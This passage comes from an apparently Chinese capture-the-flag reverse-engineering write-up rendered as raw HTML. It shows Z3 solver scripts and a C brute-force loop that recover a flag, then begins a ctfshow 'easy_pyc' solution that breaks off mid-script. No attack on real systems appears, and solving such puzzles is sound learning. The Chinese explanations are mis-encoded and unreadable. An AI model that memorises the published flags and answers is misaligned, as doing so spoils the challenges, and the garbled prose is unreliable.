number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">890415359</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"292\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"293\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"294\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"295\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"296\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"297\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"304\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"305\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"306\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"307\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"308\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">23493664</span></pre></td></tr><tr><td data-num=\"309\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"310\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"311\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"325\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1967260144</span></pre></td></tr><tr><td data-num=\"326\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"327\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"328\"></td><td><pre>strflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"329\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># æ£€æµ‹æ˜¯å¦æœ‰è§£</span></pre></td></tr><tr><td data-num=\"330\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a1<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># å› ä¸ºæœ€åå¾—å‡ºçš„æ˜¯ç­‰å¼ï¼Œå…ˆéå† a1ï¼ŒæŠŠ a1 çš„æ¯ä¸ªä¾æ¬¡èµ‹ç»™ i</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ç„¶åæ‰¾åˆ°æ¯ä¸ª a1 å¯¹åº”çš„è§£ï¼Œé™„åŠ åˆ°ç©ºåˆ—è¡¨çš„åé¢</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'æ— è§£'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre><span class=\"token comment\">#å¾— [104, 97, 104, 97, 104, 97, 116, 104, 105, 115, 105, 115, 102, 97, 99, 107, 102, 108, 97, 103]</span></pre></td></tr></table></figure><p><strong>æ³¨æ„ Z3 çº¦æŸæ±‚è§£å™¨ - åˆå§‹åŒ–åºåˆ—æ—¶é€‰æ‹©æ­£ç¡®çš„æ ¼å¼ æ¯”å¦‚è¿™é‡Œå°±æ˜¯ int å‹åºåˆ—</strong></p>\n<p>å¾—ç¬¬äºŒæ¬¡è¾“å…¥ä¸º [104, 97, 104, 97, 104, 97, 116, 104, 105, 115, 105, 115, 102, 97, 99, 107, 102, 108, 97, 103]</p>\n<p><img data-src=\"/images/image-20230331183241670.png\" alt=\"image-20230331183241670\"></p>\n<p>z3 çš„æ•°æ®åœ¨è¿™é‡Œç”¨åˆ°ï¼Œåˆ weneed æ¯”è¾ƒæ•°æ®å·²çŸ¥ å¯æ±‚å‡ºæ•°ç»„ tempp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x00001207</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004F21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001A523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000023A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000926</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00006560</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001A99B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001BBE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00003705</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000926</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000077D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00009A98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000657B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000018</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000B11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>z33<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    cp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token operator\">=</span>z33<span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>cp (æ¯”è¾ƒæ•°æ®) ä¸å€’è¿‡æ¥çš„ z33 æ•°æ®å¼‚æˆ–å¾— tempp æ•°ç»„ [4704, 19649, 20301, 95, 107848, 601, 2375, 19649, 25875, 95, 109032, 19649, 113544, 14193, 2375, 30651, 39673, 25875, 121, 2937]</p>\n<p><img data-src=\"/images/image-20230331203202364.png\" alt=\"image-20230331203202364\"></p>\n<p><img data-src=\"/images/image-20230331203306709.png\" alt=\"image-20230331203306709\"></p>\n<p>æœ€åçš„å…³é”®åœ¨è¿™ä¸€æ­¥å‡½æ•°ï¼Œåˆå› ä¸ºå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ int æ•°ç»„ somenum å·²çŸ¥ï¼Œtempp å·²çŸ¥ï¼Œç›´æ¥çˆ†ç ´ flag</p>\n<p>C è¯­è¨€çˆ†ç ´è„šæœ¬å¦‚ä¸‹</p>\n<pre><code class=\"language-C\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint baopo(int a1, int a2)&#123;\n    &#123;\n  unsigned int v3; \n  v3 = 1;\n  while ( a2 )\n  &#123;\n    if ( (a2 &amp; 1) != 0 )\n      v3 *= a1;\n    a1 = a1 * a1 % 1000;\n    a2 &gt;&gt;= 2;\n  &#125;\n  return v3;\n&#125;\n&#125;\nint main()&#123;\n    unsigned int somenum[20] = &#123;\n    0x00000007, 0x00000007, 0x00000007, 0x00000009, 0x00000005, 0x00000006, 0x00000007, 0x00000007, \n    0x00000007, 0x00000009, 0x00000007, 0x00000007, 0x00000005, 0x00000007, 0x00000007, 0x00000007, \n    0x00000005, 0x00000007, 0x00000009, 0x00000007\n&#125;;\nint cp[20]=&#123;4704, 19649, 20301, 95, 107848, 601, 2375, 19649, 25875, 95, 109032, 19649, 113544, 14193, 2375, 30651, 39673, 25875, 121, 2937&#125;;\n    int flag[20]=&#123;0&#125;;\n    for(int i=0; i&lt;20; i++)&#123;\n        \n        while (baopo(flag[i],somenum[i]) != cp[i])\n        &#123;\n         flag[i]++;\n        &#125;;\n        printf(&quot;%d &quot;,flag[i]);\n    \n&#125;\n&#125;\n\n</code></pre>\n<p>è¿è¡Œç»“æœ 84 49 101 95 122 51 95 49 115 95 118 49 114 57 95 51 97 115 121 33</p>\n<p>è½¬å­—ç¬¦å³ä¸º flag:    T1e_z3_1s_v1r9_3asy!    æŠŠ flag ç”¨ç»™å®šçš„æ ¼å¼åŒ…èµ·æ¥æäº¤å°±è¡Œäº†</p>\n<p>â€‹</p>\n<h2 id=\"ctfshowæ„šäººæ¯re\"><a class=\"markdownIt-Anchor\" href=\"#ctfshowæ„šäººæ¯re\">#</a> ctfshow æ„šäººæ¯ RE</h2>\n<p><img data-src=\"/images/image-20230402190420667.png\" alt=\"image-20230402190420667\"></p>\n<p>é™¤äº†ä¸€é“æŠ½è±¡è°œè¯­é¢˜ å…¶ä»–æŒºç®€å•çš„ æˆ‘éƒ½èƒ½ä¸€çœ¼ä¸çœŸ</p>\n<h3 id=\"easy_pyc\"><a class=\"markdownIt-Anchor\" href=\"#easy_pyc\">#</a> easy_pyc</h3>\n<p>å…ˆè§£ pyc å‘ç°å¾ˆç®€å• ä¸è¿‡å°± 114514 æœ‰ç‚¹è¿·æƒ‘æ€§ å…¶å®å¯ä»¥ç›´æ¥å»æ‰ æˆ‘ç›´æ¥ z3 è§£å‡º</p>\n<p><img data-src=\"/images/image-20230401162939514.png\" alt=\"image-20230401162939514\"></p>\n<h4 id=\"è„šæœ¬åŠflag\"><a class=\"markdownIt-Anchor\" href=\"#è„šæœ¬åŠflag\">#</a> è„šæœ¬åŠ flag</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>code <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>    <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1d</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x2c</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x6d</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0xbd</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0xf7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x2a</span><span class=\"token punctuation\">,</span>    <span class=\"token number\">0x0d</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xda</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xf9</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xda</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd4</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd1</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x0b</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xc7</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xc7</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xa1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>l <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>codec<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    codec<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>l <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> codec<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>code<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># æ£€æµ‹æ˜¯å¦æœ‰è§£</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a1<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># å› ä¸ºæœ€åå¾—å‡ºçš„æ˜¯ç­‰å¼ï¼Œå…ˆéå† a1ï¼ŒæŠŠ a1 çš„æ¯ä¸ªä¾æ¬¡èµ‹ç»™ i</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ç„¶åæ‰¾åˆ°æ¯ä¸ª a1 å¯¹åº”çš„è§£ï¼Œé™„åŠ åˆ°ç©ºåˆ—è¡¨çš„åé¢</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 